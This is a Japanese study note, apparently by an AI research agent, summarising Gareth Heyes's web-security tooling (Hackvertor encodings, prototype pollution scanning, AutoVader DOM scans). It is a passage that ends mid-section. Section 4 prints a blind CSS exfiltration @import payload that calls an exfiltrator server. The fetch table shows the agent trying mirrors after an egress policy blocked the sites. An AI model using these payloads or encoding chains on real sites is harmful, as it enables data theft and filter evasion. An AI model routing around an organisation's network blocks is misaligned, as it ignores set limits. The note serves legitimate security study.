# [19] JavaScript for Hackers（Gareth Heyes）／ garethheyes.co.uk — 精読ノート（ch03: JS難読化・短縮・クライアントサイド攻撃）

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
|-----|------|----------|------|
| https://leanpub.com/javascriptforhackers | **failed** | WebFetch → EGRESS_BLOCKED / curl → CONNECT 403 | 組織のegressポリシーでleanpub.comが遮断。WebSearchも予算枯渇（200/200）で二次情報検索も不可。→ 目次・本文は取得できず。下記「読者が自分で開くべき資料」参照 |
| https://garethheyes.co.uk/ | **failed** | WebFetch → EGRESS_BLOCKED / curl → CONNECT 403 | 同上。garethheyes.co.uk / thespanner.co.uk / portswigger.net / web.archive.org / r.jina.ai / googleusercontent いずれもポリシー403で遮断。記事本文は取得できず |
| （代替一次資料）https://github.com/hackvertor/hackvertor（+ wiki） | **full** | curl raw.githubusercontent.com | 同一著者（Gareth Heyes＝GitHub: hackvertor）の公開リポジトリ。書籍テーマ「JSエンコード/難読化」に直結。README・wiki（Tag-Reference / Tag-Syntax）・CHANGELOGを逐語取得 |
| （代替一次資料）https://github.com/hackvertor/MentalJS | **full** | curl raw | JSパーサ＆サンドボックス。JS構文解析／難読化の理解に直結 |
| （代替一次資料）https://github.com/hackvertor/server-side-prototype-pollution | **full** | curl raw | プロトタイプ汚染（サーバサイド）スキャナ。手法一覧を逐語取得 |
| （代替一次資料）https://github.com/hackvertor/blind-css-exfiltration | **full** | curl raw | CSSインジェクションによる盲目的データ窃取 |
| （代替一次資料）https://github.com/hackvertor/auto-vader | **full** | curl raw | DOM Invader自動化（DOM XSS/プロトタイプ汚染/postMessage/クライアントリダイレクト） |
| （代替一次資料）clickbandit / visualfuzzer / taborator / shadow-repeater / repeat-strike / document-my-pentest / speedy / feedworm / amplify-the-hacker | **full** | curl raw | 各READMEを取得。clickjacking・Unicode(Zalgo)ファジング等 |

> **重要な但し書き**: 担当2URL（Leanpub書籍ページ、garethheyes.co.uk）は**ネットワークegressポリシーにより完全遮断**され、目次・説明文・記事本文は1文字も取得できていない。本ノートの「詳細ノート」本体は、**同一著者（Gareth Heyes）の公開GitHubリポジトリから逐語取得した代替一次資料**と、明示した**〔補足（一般知識）〕**で構成する。書籍/ブログそのものの逐語引用ではない点に注意（教科書執筆時はこの由来を保持すること）。

## 要約（3〜10行）

- 本担当は「JavaScript for Hackers（著: Gareth Heyes, Leanpub刊）」書籍ページと、著者個人ブログ garethheyes.co.uk の精読。両URLとも本セッションのegressポリシーで遮断され直接取得不能、WebSearchも枯渇のため、著者本人のGitHub（hackvertor）から同テーマの一次資料を代替取得した。
- Gareth HeyesはPortSwiggerの研究者で、XSS／DOM clobbering／mutation XSS／prototype pollution（クライアント・サーバ両方）／CSPバイパス／JS短縮・難読化の第一人者。書籍・ブログはこれら研究の集大成。
- 代替一次資料の中核は **Hackvertor**（タグベースのエンコード/デコード/ハッシュ/暗号/文字列変換をネスト可能に連鎖させるBurp拡張）で、書籍が扱う「エンコーディングの入れ子による難読化・WAF回避」の実装そのもの。Tag-Reference/Tag-Syntaxを表として完全収録した。
- **MentalJS**（JSパーサ＆サンドボックス：変数/アクセサに`$`接尾辞を付けてホワイトリスト化）、**server-side prototype pollution scanner**（検出テクニック8種の逐語一覧）、**blind CSS exfiltration**（`@import`で未知ページを盲目窃取）、**AutoVader**（DOM Invader自動化）も収録。
- 書籍の想定章立て・ブログ記事群（DOM clobbering／mXSS／prototype pollution／CSPバイパス／短縮XSS）は〔補足（一般知識）〕として整理し、原典が読めなかった旨と読みどころを明記した。

---

## 詳細ノート

### 0. 前提：本ノートの構成方針（出典の明確化）

担当2URLは遮断されたため、以下は**取得できた代替一次資料（Gareth Heyes本人のGitHub）**の逐語＋要約と、**〔補足（一般知識）〕**で構成する。各節に出典URLを明記する。書籍・ブログの逐語引用はできていない。

---

### 1. Hackvertor — タグベース変換エンジン（書籍テーマ「エンコード連鎖による難読化」の実装） （出典: https://github.com/hackvertor/hackvertor, https://github.com/hackvertor/hackvertor/wiki）

**概要（README逐語要約）**: HackvertorはJava製のタグベース変換ツールで、Burp Suite拡張として実装される。タグは次の形で構成する。`<@base64></@base64>` — `@`記号がHackvertorタグの識別子で、続くタグ名（この例では base64）を表す。タグは引数もサポートする。find タグは正規表現で文字列を検索でき、タグ名の後に括弧が付く: `<@find("\\w")>abc</@find>`。引数は3種類 — 文字列（ダブル/シングルクォート）、真偽値（true, false）、数値（16進数含む）。**ネストは無制限**で、複数タグでエンコード/デコードを連鎖できる。Hackvertorは**最内タグから最外タグへ**順に変換する。

**Hackvertorの位置づけ（wiki Home 逐語要約）**: エンコード・デコード・ハッシュ・暗号化・データ変換を単純なタグ構文で行う。Burpと深く統合し、リクエスト/レスポンスをタグで変換、複数変換の連鎖、Python(Jython)/JavaScript(GraalVM)/Java(BeanShell)/Groovyでのカスタムタグ作成、Tag Automatorによる自動化、AIによるカスタムタグ生成が可能。現行版 v2.2.67（2026年9月）。

**主要機能（wiki逐語）**:
- タグベース変換: `<@base64>Hello World</@base64>` → `SGVsbG8gV29ybGQ=`
- ネスト連鎖: `<@urlencode_all><@base64>payload</@base64></@urlencode_all>`
- Jigsaw Mode: タグをドラッグ&ドロップで組む
- Tag Expressions: `check` タグで条件付き変換 `<@check(isJson,'exec_key')>{}</@check> && <@base64>foo</@base64>`
- 20以上のタグカテゴリ（Encoding / Decoding / Hashing / Encryption/Decryption / String / Math / Compression 他）
- カスタムタグ（Python/JavaScript/Java/Groovy）
- Burp統合: メインタブ、Proxy/Repeater/Intruderのコンテキストメニュー、メッセージエディタタブ、Intruderペイロードプロセッサ、HTTPハンドラによる自動タグ処理、Custom Actions/フィルタへ変換エンジンを露出する Bambda スニペット

#### コード/コマンド（原文のまま逐語）

タグ構文の基本:
```
<@tag_name>content</@tag_name>
<@base64>Hello World</@base64>
→ SGVsbG8gV29ybGQ=
<@uppercase>hello</@uppercase>
→ HELLO
<@md5>password</@md5>
→ 5f4dcc3b5aa765d61d8327deb882cf99
```

引数付きタグ（文字列はシングルクォート、数値はクォート不要）:
```
<@replace('old','new')>old text</@replace>
→ new text
<@rotN(13)>Hello</@rotN>
→ Uryyb
<@substring(0,5)>Hello World</@substring>
→ Hello
```

自己終了タグ:
```
<@get_variable1/>
<@timestamp/>
<@uuid/>
```

ネスト（最内→最外の順に処理）:
```
<@urlencode_all><@base64>payload</@base64></@urlencode_all>
```
処理順:
1. `payload` → Base64 encode → `cGF5bG9hZA==`
2. `cGF5bG9hZA==` → URL encode all → `%63%47%46%35%62%47%39%68%5a%41%3d%3d`

多段ネスト:
```
<@hex_escapes><@base64><@gzip_compress>data</@gzip_compress></@base64></@hex_escapes>
```
処理: 1. data → gzip 圧縮 → 2. Base64 encode → 3. 各文字を hex エスケープ

変数:
```
<@set_variable1(false)>my_value</@set_variable1>   （false=セッション限定、true=永続）
<@get_variable1/>
```
例:
```
<@set_variable1(false)>secret</@set_variable1>
Key: <@get_variable1/>
Hash: <@md5><@get_variable1/></@md5>
→ Key: secret / Hash: 5ebe2294ecd0e0f08eab7690d2a6ee69
```

コンテキストタグ:
```
<@context_request/>     全HTTPリクエスト
<@context_body/>        リクエストボディ
<@context_url('$host')/>  URL要素（$protocol,$host,$path等）
<@context_header('name')/>  ヘッダ値
<@context_param('name')/>   パラメータ値
```

正規表現引数（変換対象を正規表現で指定）:
```
<@dec2hex('(\\d+)')>The number is 255</@dec2hex>
→ The number is ff
<@hex2dec('([a-f0-9]+)')>Value: ff</@hex2dec>
```

Tag Expressions（v2.2.65〜）— `check`タグと論理演算子:
```
<@check(tag_name,'exec_key')>input</@check>
<@check('isJson','exec_key')>{"a":1}</@check> && <@base64>foo</@base64>
→ Zm9v
```
- 予測タグ: `<@isJson>`（入力がJSONオブジェクト/配列でtrue）、`<@isNumeric>`（符号・小数・指数付き10進数でtrue）
- 演算子: `A && B`（Aが真ならB、偽ならA）／`A || B`（Aが真ならA、偽ならB）／`!A`（反転）
- Falsy = 出力が空、文字列`false`、またはエラーを投げたオペランド
- `&&`は`||`より優先。短絡評価あり。boolean結果はJSXのbooleanのように**何も描画しない**
- タグ名にアンダースコアを含む場合のみクォート必要（`<@check('is_admin','exec_key')>` / `<@check(isJson,'exec_key')>`）
- checkタグが無ければ`&&`,`||`,`!`はリテラル文字として扱われる（既存ペイロード互換）

#### Tag Reference（全カテゴリ・逐語表） （出典: hackvertor wiki / Tag-Reference）

**Encoding — Base Encoding**

| Tag | Description | Example |
|-----|-------------|---------|
| `base64` | Base64 encode | `<@base64>Hello</@base64>` → `SGVsbG8=` |
| `base64url` | URL-safe Base64 | `<@base64url>Hello!</@base64url>` → `SGVsbG8h` |
| `base32` | Base32 encode | `<@base32>Hello</@base32>` → `JBSWY3DP` |
| `base58` | Base58 encode | `<@base58>Hello</@base58>` → `9Ajdvzr` |

**Encoding — URL Encoding**

| Tag | Description | Example |
|-----|-------------|---------|
| `urlencode` | Standard URL encode | `<@urlencode>Hello World!</@urlencode>` → `Hello+World%21` |
| `urlencode_all` | Encode all characters | `<@urlencode_all>ABC</@urlencode_all>` → `%41%42%43` |
| `urlencode_not_plus` | URL encode without + for spaces | `<@urlencode_not_plus>a b</@urlencode_not_plus>` → `a%20b` |
| `burp_urlencode` | Burp-style URL encode | `<@burp_urlencode>test</@burp_urlencode>` |

**Encoding — HTML Encoding**

| Tag | Description | Example |
|-----|-------------|---------|
| `html_entities` | HTML entity encode | `<@html_entities><script></@html_entities>` → `&lt;script&gt;` |
| `html5_entities` | HTML5 named entities | `<@html5_entities>text</@html5_entities>` |
| `hex_entities` | Hex HTML entities | `<@hex_entities>ABC</@hex_entities>` → `&#x41;&#x42;&#x43;` |
| `dec_entities` | Decimal HTML entities | `<@dec_entities>ABC</@dec_entities>` → `&#65;&#66;&#67;` |

**Encoding — Hex Encoding**

| Tag | Description | Example |
|-----|-------------|---------|
| `hex` | Hex encode | `<@hex>ABC</@hex>` → `414243` |
| `ascii2hex` | ASCII to hex with optional separator | `<@ascii2hex(' ')>ABC</@ascii2hex>` → `41 42 43` |
| `sql_hex` | SQL hex format | `<@sql_hex>test</@sql_hex>` |

**Encoding — Escape Sequences**

| Tag | Description | Example |
|-----|-------------|---------|
| `hex_escapes` | \xNN format | `<@hex_escapes>A</@hex_escapes>` → `\x41` |
| `unicode_escapes` | \uNNNN format | `<@unicode_escapes>A</@unicode_escapes>` → `\u0041` |
| `octal_escapes` | \NNN format | `<@octal_escapes>A</@octal_escapes>` → `\101` |
| `css_escapes` | CSS \NNNNNN format | `<@css_escapes>A</@css_escapes>` → `\000041` |

**Encoding — Other**

| Tag | Description | Example |
|-----|-------------|---------|
| `utf7` | UTF-7 encode with exclusion pattern | `<@utf7('[A-Za-z0-9]')>Hello!</@utf7>` → `Hello+ACE-` |
| `quoted_printable` | Quoted-printable encode | `<@quoted_printable>test=</@quoted_printable>` |
| `js_string` | JavaScript string escape | `<@js_string>Hello"World</@js_string>` → `Hello\"World` |
| `json_escape` | JSON string escape | `<@json_escape>Hello"World</@json_escape>` → `Hello\"World` |
| `json_string_escape` | JSON string escape (alias) | 同上 |
| `to_charcode` | Character codes | `<@to_charcode>ABC</@to_charcode>` |
| `php_chr` | PHP chr() format | `<@php_chr>test</@php_chr>` |
| `php_non_alpha` | PHP non-alphanumeric | `<@php_non_alpha>code</@php_non_alpha>` |
| `powershell_encode` | PowerShell encoding | `<@powershell_encode>command</@powershell_encode>` |

**Decoding（多くは `d_` 接頭辞）**

| Tag | Description | Example |
|-----|-------------|---------|
| `d_base64` | Base64 decode | `<@d_base64>SGVsbG8=</@d_base64>` → `Hello` |
| `d_base64url` | URL-safe Base64 decode | `<@d_base64url>SGVsbG8h</@d_base64url>` → `Hello!` |
| `d_base32` | Base32 decode | `<@d_base32>JBSWY3DP</@d_base32>` → `Hello` |
| `d_base58` | Base58 decode | `<@d_base58>9Ajdvzr</@d_base58>` → `Hello` |
| `d_url` | URL decode | `<@d_url>Hello%20World</@d_url>` → `Hello World` |
| `d_html_entities` | HTML entity decode | `<@d_html_entities>&lt;script&gt;</@d_html_entities>` → `<script>` |
| `d_html5_entities` | HTML5 entity decode | `<@d_html5_entities>&copy;</@d_html5_entities>` |
| `d_utf7` | UTF-7 decode | `<@d_utf7>+AKM-</@d_utf7>` → `£` |
| `d_js_string` | JS string unescape | `<@d_js_string>Hello\"World</@d_js_string>` |
| `json_unescape` | JSON string unescape | `<@json_unescape>Hello\"World</@json_unescape>` |
| `d_css_escapes` | CSS unescape | `<@d_css_escapes>\000041</@d_css_escapes>` → `A` |
| `d_octal_escapes` | Octal unescape | `<@d_octal_escapes>\101</@d_octal_escapes>` → `A` |
| `hex2ascii` | Hex to ASCII | `<@hex2ascii>414243</@hex2ascii>` → `ABC` |
| `d_quoted_printable` | Quoted-printable decode | `<@d_quoted_printable>=3D</@d_quoted_printable>` |
| `auto_decode` | 自動検出してデコード | |
| `auto_decode_no_decrypt` | 復号を試みない自動デコード | |

**Hash**: `md2` `md4` `md5`（例: `<@md5>test</@md5>` → `098f6bcd4621d373cade4e832627b4f6`）／`sha1`（→`a94a8fe5ccb19ba61c4c0873d391e987982fbbd3`）`sha224` `sha256` `sha384` `sha512`／`sha3` `sha3_224` `sha3_256` `sha3_384` `sha3_512`／`ripemd128/160/256/320` `whirlpool` `tiger` `gost3411` `sm3`／Skein系: `skein_256_128` `skein_256_160` `skein_256_224` `skein_256_256` `skein_512_128` `skein_512_160` `skein_512_224` `skein_512_256` `skein_512_384` `skein_512_512` `skein_1024_384` `skein_1024_512` `skein_1024_1024`

**HMAC**: `hmac_md5` `hmac_sha1` `hmac_sha224` `hmac_sha256` `hmac_sha384` `hmac_sha512`（引数=secret。例 `<@hmac_sha256('key')>message</@hmac_sha256>`）

**Encryption — AES/XOR/古典暗号**

| Tag | Arguments | Description |
|-----|-----------|-------------|
| `aes_encrypt` | key, transformation, IV | AES暗号化 |
| `aes_decrypt` | key, transformation, IV | AES復号 |
| `xor` | key | XOR |
| `xor_decrypt` | key | XOR復号（xorと同じ） |
| `xor_getkey` | known plaintext | XORキー復元試行 |
| `rotN` | rotation | シーザー暗号 `<@rotN(13)>Hello</@rotN>`→`Uryyb` |
| `rotN_bruteforce` | - | 全ローテーション試行 |
| `atbash_encrypt`/`atbash_decrypt` | - | Atbash `<@atbash_encrypt>hello</@atbash_encrypt>`→`svool` |
| `substitution_encrypt`/`substitution_decrypt` | alphabet | 換字式 |
| `affine_encrypt`/`affine_decrypt` | a, b | アフィン暗号 |
| `rail_fence_encrypt`/`rail_fence_decrypt` | rails | レールフェンス暗号 |

AES例:
```
<@aes_encrypt('16bytesecretkey!','AES/CBC/PKCS5Padding','16bytesiv1234567')>plaintext</@aes_encrypt>
```

**Cryptanalysis**: `is_like_english`（英語らしさスコア）／`index_of_coincidence`（IoC計算）／`guess_key_length`（Vigenèreキー長推定）

**String（大小変換）**: `uppercase` `lowercase` `capitalise` `uncapitalise`

**String（操作）**

| Tag | Arguments | Description | Example |
|-----|-----------|-------------|---------|
| `reverse` | - | 文字列反転 | `<@reverse>Hello</@reverse>`→`olleH` |
| `length` | - | 文字数 | `<@length>Hello</@length>`→`5` |
| `substring` | start, length | 部分文字列 | `<@substring(0,5)>Hello World</@substring>`→`Hello` |
| `replace` | search, replace | 置換 | `<@replace('o','0')>Hello</@replace>`→`Hell0` |
| `regex_replace` | pattern, replace | 正規表現置換 | `<@regex_replace('[0-9]','X')>abc123</@regex_replace>`→`abcXXX` |
| `find` | pattern | マッチ検索 | `<@find('[0-9]+')>abc123def</@find>` |
| `repeat` | count | 繰り返し | `<@repeat(3)>A</@repeat>`→`AAA` |
| `unique` | - | 重複除去 | `<@unique>aabbcc</@unique>` |
| `split_join` | split, join | 分割再結合 | `<@split_join(',','-')>a,b,c</@split_join>`→`a-b-c` |
| `from_charcode` | - | 文字コード→文字列 | `<@from_charcode>65,66,67</@from_charcode>`→`ABC` |
| `pretty_json` | - | JSON整形 | `<@pretty_json>{"a":1}</@pretty_json>` |
| `json2form` | - | JSON→フォームデータ | `<@json2form>{"a":"1","b":"2"}</@json2form>`→`a=1&b=2` |

**Whitespace**: `space`(count) `newline`(count) `remove_output`

**CHANGELOG抜粋（逐語, 出典: hackvertor/CHANGELOG.md）**:
- v2.2.67 (2026-09-17): What's newタブ追加
- v2.2.65 (2026-09-16): `check`タグ（組込/カスタムタグを入力に対する式として呼べる）、ホットキーのカスタム化、Jigsawモード追加
- v2.2.61 (2026-09-12): UI修正
- v2.2.57 (2026-06-03): UI/Repeaterでのスマートペースト追加
- v2.2.52/54 (2026-05-28): SMTPで一般的な「改行で分割されたbase64」をデコードするスマートデコーダ改良
- v2.2.51 (2026-05-20): Tag Automatorでrequest/response利用可能に、リクエストのUTF-8問題修正
- v2.2.46 (2026-05-20): Bambdaコードのクリップボードコピー、textToPdfタグ、csv_to_xslxタグ
- v2.2.43 (2026-01-21): Montoya APIでWebSocketサポート、hex UI改良
- v2.2.42 (2026-01-21): super decode機能（smart decode + super decodeを1アクションに統合）

> **書籍との関連**: 「JavaScript for Hackers」および著者ブログの中心テーマは、XSS/インジェクションのペイロードを**多重エンコード・文字コード化・エスケープシーケンス化**してWAFやフィルタを回避することにある。Hackvertorの各タグ（`hex_escapes` `unicode_escapes` `octal_escapes` `dec_entities` `hex_entities` `utf7` `to_charcode` `from_charcode` など）と**ネスト連鎖**はまさにその実装であり、教科書の「難読化・短縮」章の実践ツールとして提示できる。

---

### 2. MentalJS — JSパーサ＆サンドボックス （出典: https://github.com/hackvertor/MentalJS）

**README逐語**: 「MentalJS is a JavaScript parser and sandbox. It whitelists JavaScript code by adding a "$" suffix to variables and accessors.」（MentalJSはJavaScriptのパーサ兼サンドボックス。変数とアクセサに「$」接尾辞を付けることでコードをホワイトリスト化する。）

#### コード（原文のまま逐語）
```javascript
var js = MentalJS();
js.parse({
    code:'1+1',
    result:function(result){ 
      alert(result) 
    }
});
```

> **書籍との関連**: MentalJSはJSを字句/構文解析し、識別子・プロパティアクセスに`$`を付与して安全な部分集合のみを許すサンドボックス。これはXSS Auditor/サンドボックス回避や、「JSパーサの気持ちを理解して短縮・難読化ベクタを作る」という書籍の核心と直結する。〔補足（一般知識）〕JSのトークナイザ/ASTの挙動（自動セミコロン挿入、`/`の除算とregexリテラルの曖昧性、テンプレートリテラル、コメントの扱い）を突く難読化はこの章群の中心。

---

### 3. Server-side Prototype Pollution scanner（プロトタイプ汚染） （出典: https://github.com/hackvertor/server-side-prototype-pollution）

**README逐語要約**: この拡張はサーバサイドのプロトタイプ汚染脆弱性を検出する（Burp Suite v2021.9以降が必要）。手法はGareth Heyesの講演「server side prototype pollution」（PortSwigger research）に基づく。レート制限したい場合はDistribute Damage拡張を併用。

**スキャンオプション（逐語）**:
- **Body scan** — JSONボディを各手法でスキャン
- **Body dot scan** — ドット記法でJSONボディをスキャン（例 `__proto__.x`）
- **Body square scan** — 角括弧記法でスキャン（例 `__proto__[x]`）
- **Param scan** — クエリパラメータ等の中のJSONをスキャン（元リクエストに既存JSONが必要）
- **Param dot scan** — クエリパラメータ内JSONをドット記法でスキャン
- **Param square scan** — クエリパラメータ内JSONを角括弧記法でスキャン
- **Add js property scan** — `constructor`等のクエリパラメータを追加して漏洩するJSコードを発見
- **JS property param scan** — `constructor`等の名前のパラメータを操作して漏洩JSコードを発見
- **Async body scan** — `--inspect`フラグを使い非同期にプロトタイプ汚染を検出
- **Async param scan** — 同上をクエリパラメータ等で実施
- **Full scan** — 全手法で検出を試みる

**検出テクニック（逐語, PortSwiggerブログに詳細）**:
- JSON spaces
- Async
- Status
- Options
- Blitz
- Exposed headers
- Reflection
- Non reflected property

#### ビルド（逐語）
```
Linux:   ./gradlew build fatjar
Windows: gradlew.bat build fatjar
出力:    build/libs/server-side-prototype-pollution-all.jar
```

> **書籍との関連**: プロトタイプ汚染は書籍の主要章の一つ。`__proto__` / `constructor.prototype` をドット・角括弧の両記法で汚染し、`Object.prototype`にプロパティを注入する。上記テクニック名（JSON spaces=応答のJSON整形の乱れで検出、Status=ステータスコード変化、Options=HTTP OPTIONS応答の変化、Reflection=注入値の反射、Exposed headers=`Access-Control-Expose-Headers`等の変化）は、クライアント/サーバ双方で汚染成立を「観測可能な副作用」で検出する実践知として教科書に転記価値が高い。

---

### 4. Blind CSS Exfiltration（CSSインジェクションによる盲目的窃取） （出典: https://github.com/hackvertor/blind-css-exfiltration）

**README逐語要約**: 「Exfiltrate unknown web pages（未知のWebページをExfiltrate）」。exfiltratorを動かすにはソースを取得しnodeで実行する: `node css-exfiltrator-server.js`。既定でlocalhost:5001で起動。exfiltrationを開始するには、exfiltratorサーバへ`@import`リクエストを送る。

#### コード（原文のまま逐語）
```html
<style>
@import 'http://localhost:5001/start';    
</style>
```
デモ（PortSwiggerラボ, 1IPにつき1回のみ exfiltrate可）:
```html
<style>
@import 'https://portswigger-labs.net/blind-css-exfiltration/start';    
</style>
```
仕組みの詳細はブログ記事「Blind CSS Exfiltration」（https://portswigger.net/research/blind-css-exfiltration）に記載。

> **書籍/ブログとの関連**: CSSのみが注入できる状況（`<style>`や`style`属性、`@import`可）で、属性セレクタ`[attr^="a"]{background:url(...)}`のような手法により、CSRFトークンやパスワードマネージャの自動入力値などを1文字ずつ盲目的に窃取する。`@import`で外部スタイルを読み込ませ、動的にセレクタを生成して段階的に絞り込むのが「blind」たる所以。garethheyes.co.uk/PortSwigger researchの主要記事の一つ。

---

### 5. AutoVader — DOM Invader自動化（DOM系脆弱性の自動探索） （出典: https://github.com/hackvertor/auto-vader）

**README逐語要約**: AutoVaderはDOM InvaderとPlaywright Javaを統合し、Web上のDOMベース脆弱性を自動発見するBurp拡張。要件: Burp Suite Professional（DOM Invaderに必須）、DOM Invader拡張（Burpから自動検出）。Target/Proxy History/Repeaterで右クリックしコンテキストメニューから各スキャンを実行。

**スキャン種別（逐語）**:
- **Open DOM Invader** — DOM Invader設定済みブラウザを開き手動テスト
- **Scan all GET params** — 全クエリパラメータを列挙しcanary値を注入、URL入力由来のDOM脆弱性を検出
- **Scan all GET params for gadgets** — 設定したHTMLタグ/属性にcanaryを注入し、URL入力由来のDOMガジェットを検出
- **Scan all POST params** — 全POSTパラメータにcanary注入
- **Scan web messages** — postMessage脆弱性をテスト（オリジン偽装、メッセージ注入、危険なメッセージハンドラ特定）
- **Inject into all sources** — 全sourceにペイロード注入、各種入力ベクタでDOM XSSをテスト
- **Inject into all sources & click everything** — 上記＋クリックイベント発火（イベントハンドラ内脆弱性の発見）
- **Scan for client side prototype pollution** — クエリ文字列/ハッシュ/JSON入力でプロトタイプ汚染を検出、自動チェックで確認
- **Scan for client side prototype pollution gadgets** — 汚染で悪用可能なガジェットを発見、危険なプロパティ代入を特定
- **Intercept client side redirect** — クライアントサイドリダイレクトにブレークポイント、open redirect特定

**設定（逐語）**: DOM Invaderへのパス上書き／Burp Chromiumへのパス上書き／Payload（canaryに付与するカスタムペイロード）／HTML tags to scan（ガジェット用の走査タグ）／Attributes to scan（走査属性）／Delay／Always open devtools／Remove CSP（DOM Invaderを正しく動かすためCSPヘッダ除去、既定有効）／Headless／Auto run from Repeater・Intruder・other extensions（`$canary`プレースホルダ必要）

**動作原理（逐語）**: 1. PlaywrightでDOM Invader拡張入りheadless Chromiumを起動 → 2. スキャン種別に応じDOM Invader設定を自動構成 → 3. 適切なペイロード付きURLへ遷移 → 4. DOM Invaderの検出をコールバックで捕捉しBurp issueとして報告 → 5. 重複排除。技術基盤: Playwright Java（ブラウザ自動化）、DOM Invader（脆弱性検出）、Burp Montoya API（拡張統合）。

> **書籍/ブログとの関連**: DOM XSS・source/sink（`location.hash`→`innerHTML`など）・postMessage・クライアントサイドプロトタイプ汚染・open redirectはクライアントサイド脆弱性ハンティングの核。AutoVaderのスキャン種別は、教科書の「探索対象の分類（source/sink/gadget/message/redirect）」の実務的チェックリストとして極めて有用。`Remove CSP`が既定有効な点はCSPが動的解析を妨げる実務問題を示す。

---

### 6. その他のツール（READMEより。書籍テーマの周辺技術）

- **clickbandit** （https://github.com/hackvertor/clickbandit）: 「A JavaScript clickjacking PoC generator」。JSでクリックジャッキングのPoCを生成。〔補足（一般知識）〕透明iframe＋オーバーレイでユーザ操作を奪う攻撃のPoC自動生成。
- **visualfuzzer** （https://github.com/hackvertor/visualfuzzer）: 「A visual fuzzer written in NodeJS to find Zalgo characters」。Zalgo（結合文字を多重付与した崩れ文字）を見つけるビジュアルファザー。〔補足（一般知識）〕Unicode正規化・結合文字・オーバーフロー描画を突く入力の探索。パーサ差異やmutation XSSに通じる。
- **taborator** （https://github.com/hackvertor/taborator）: Collaboratorクライアントをタブに表示し、タブ名にインタラクション数を出すBurp拡張。Repeaterで右クリック→Taborator→Insert Collaborator payload / placeholder。OOB検出の効率化。
- **shadow-repeater** （https://github.com/hackvertor/shadow-repeater）: RepeaterでのペイロードのバリエーションをAIで自動生成・送信し、応答差分から弱点（path traversal, SQLi, XSS等）を探す。既定で5回目のRepeater送信時に起動、パラメータ/ヘッダ変更が必要。
- **repeat-strike**（Repeater Strike） （https://github.com/hackvertor/repeat-strike）: AIでRepeaterのリクエスト/レスポンスから正規表現を生成し、proxy historyに適用してIDOR等の類似問題を横展開検出。
- **document-my-pentest** （https://github.com/hackvertor/document-my-pentest）: テスト内容をAIが理解し自動ドキュメント化。Repeater/Proxy historyを右クリックで個別/コレクションとして記録、Organizerへ自動送信可。
- **speedy** （https://github.com/hackvertor/speedy）: Chrome拡張のRSVPスピードリーダ（100〜1000wpm、ORP強調）。著者「Created by Gareth Heyes (https://garethheyes.co.uk)」明記。MIT。
- **feedworm** （https://github.com/hackvertor/feedworm）: DevToolsパネルで動くRSS/Atomリーダ拡張。RSS/Atom XMLを`offscreen`権限で安全にパース、全データはローカル保存。著者「Made by Gareth Heyes (https://garethheyes.co.uk)」明記。
- **amplify-the-hacker** （https://github.com/hackvertor/amplify-the-hacker）: SteelCon 2025講演「Amplify the hacker: Offensive AI plugin development」の資料集。著者リンク集を逐語収録: My website=https://garethheyes.co.uk ／ My blog=https://thespanner.co.uk ／ Twitter/X=https://x.com/garethheyes ／ LinkedIn=https://www.linkedin.com/in/gareth-heyes-25a62b2/ ／ BlueSky=https://bsky.app/profile/garethheyes.co.uk ／ Mastodon=https://infosec.exchange/@gaz

---

### 7. 〔補足（一般知識）〕書籍「JavaScript for Hackers」と garethheyes.co.uk のテーマ整理

> 以下は原典（Leanpub書籍ページ・ブログ）が遮断され取得できなかったため、**取得できた事実ではなく、一般に知られている著者の研究テーマの整理**である。教科書執筆時は「原典未取得・一般知識による補完」として扱い、断定的な逐語引用として提示しないこと。

〔補足（一般知識）〕**書籍概要**: 「JavaScript for Hackers（副題は "Learn to think like a hacker" 系）」はGareth HeyesがLeanpubで刊行した書籍で、彼のPortSwigger researchやブログ（thespanner.co.uk / garethheyes.co.uk）の研究を体系化したもの。攻撃者視点でJavaScriptの言語仕様・パーサ・DOM・ブラウザ挙動を理解し、XSSベクタの作成・短縮・難読化、フィルタ/WAF/CSP回避を学ぶ実践書という位置づけ。

〔補足（一般知識）〕**書籍が扱う主要トピック（章立ては概ね以下のテーマ群。正確な章番号・章題は原典未取得のため断定しない）**:
1. JavaScriptの基礎を攻撃者視点で（型変換・暗黙の変換・グローバルオブジェクト・実行コンテキスト）
2. 短縮JavaScript / XSSベクタのコードゴルフ（最短のalert実現、`eval`/`Function`、`location`代入、バッククォート呼び出し等）
3. コメントと正規表現を使った難読化（`/* */`・行コメント、regexリテラルと除算の曖昧性、`RegExp`、`String.raw`）
4. DOM clobbering（`id`/`name`属性でグローバル変数やプロパティを上書きし、`window.x`や`document.x`を攻撃者制御下に置く）
5. mutation XSS / mXSS（`innerHTML`の再パースでサニタイザ後にHTMLが変異し、無害な入力が実行可能に変わる。名前空間混同・foreign content・属性の再解釈）
6. prototype pollution（`__proto__`/`constructor.prototype`汚染とガジェットチェーン。クライアント/サーバ双方）
7. Content-Security-Policy（CSP）バイパス（`unsafe-inline`/`nonce`再利用/JSONP/script gadgets/`base-uri`未設定/`strict-dynamic`の穴/ポリシー注入）

〔補足（一般知識）〕**garethheyes.co.uk / thespanner.co.uk / PortSwigger research の代表的な記事テーマ**（正確なタイトル・公開日は原典未取得のため断定しない）:
- DOM clobbering の攻撃と防御（clobbering collections, `HTMLCollection`, `form`要素等）
- mutation XSS（mXSS）とサニタイザ回避（DOMPurify等の過去バイパス研究）
- クライアント/サーバサイド prototype pollution とガジェット発見
- CSPバイパス各種（policy injection、script gadget、`base` タグ悪用）
- Blind CSS exfiltration（属性セレクタ＋`@import`によるデータ窃取。上記§4が対応）
- Server-side prototype pollution（上記§3が対応）
- XSSベクタの短縮・難読化（Hackvertorの各エンコーディング。上記§1が対応）
- postMessage / web message の脆弱性、DOM based open redirect（上記§5 AutoVaderが対応）

〔補足（一般知識）〕これら各テーマの「観測可能な副作用による検出」「source→sink→gadgetのモデル化」は、上記で**実際に取得できた**代替一次資料（server-side-prototype-pollution の検出テクニック名、AutoVaderのスキャン分類、Hackvertorのエンコーディング表）で裏付けられており、教科書ではそれらを一次的な根拠として引用するのが安全。

---

## 読者が自分で開くべき資料

本担当の2つの割当URLは**組織のネットワークegressポリシー（403 CONNECT拒否）により本セッションからは一切取得できなかった**。加えて WebSearch 予算も枯渇（200/200）していたため二次情報検索も不可、web.archive.org・r.jina.ai・googleusercontent 等のミラー経路もすべて同ポリシーで遮断された。以下は読者（＝教科書執筆者・学習者）が各自の環境で直接開いて確認すべき原典と読みどころ。

### A. https://leanpub.com/javascriptforhackers （書籍「JavaScript for Hackers」）
